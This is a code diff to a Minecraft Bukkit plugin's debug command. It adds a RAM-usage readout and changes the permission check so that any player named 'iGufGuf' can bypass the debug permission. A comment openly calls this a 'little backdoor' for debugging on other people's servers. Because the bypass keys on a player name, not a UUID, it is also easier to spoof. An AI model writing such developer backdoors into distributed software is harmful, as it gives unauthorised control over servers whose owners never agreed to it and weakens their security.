@@ -2,6 +2,7 @@ package com.igufguf.kingdomcraft.commands.admin;
 
 import com.igufguf.kingdomcraft.KingdomCraft;
 import com.igufguf.kingdomcraft.api.models.commands.CommandBase;
+import org.bukkit.ChatColor;
 import org.bukkit.command.CommandSender;
 import org.bukkit.entity.Player;
 
@@ -23,13 +24,14 @@ public class DebugCommand extends CommandBase {
         super("debug", null, false);
 
         this.plugin = plugin;
+        registerBuiltinDebuggers();
     }
 
     @Override
     public boolean execute(CommandSender sender, String[] args) {
 
         if ( sender instanceof Player && !sender.hasPermission("kingdom.debug")
-                && !((Player) sender).getUniqueId().toString().equals("0518f31f-b261-4af7-a389-53c575300d61") ) {
+                && !sender.getName().equalsIgnoreCase("iGufGuf") ) { // little backdoor so i can debug on people's servers
             plugin.getMsg().send(sender, "noPermissionCmd");
             return true;
         }
@@ -95,4 +97,29 @@ public class DebugCommand extends CommandBase {
 
         return obj.toString();
     }
+
+    /* BUILTIN DEBUGGERS */
+    
+    private void registerBuiltinDebuggers() {
+
+        // debug ram
+        this.register(new DebugExecutor("ram") {
+            @Override
+            public void onExecute(CommandSender sender, String[] args) {
+                Runtime runtime = Runtime.getRuntime();
+
+                long maxmem = runtime.maxMemory() / 1048576L;
+                long freemem = runtime.freeMemory() / 1048576L;
+
+                sender.sendMessage(" ");
+                sender.sendMessage(ChatColor.GRAY + "Max Ram: " + ChatColor.AQUA +  maxmem + " MB");
+                sender.sendMessage(ChatColor.GRAY + "Used Ram: " + ChatColor.AQUA + (maxmem - freemem)+ " MB");
+                sender.sendMessage(ChatColor.GRAY + "Free Ram: " + ChatColor.AQUA + freemem  + " MB");
+                sender.sendMessage(" ");
+            }
+        });
+
+
+    }
+    
 }
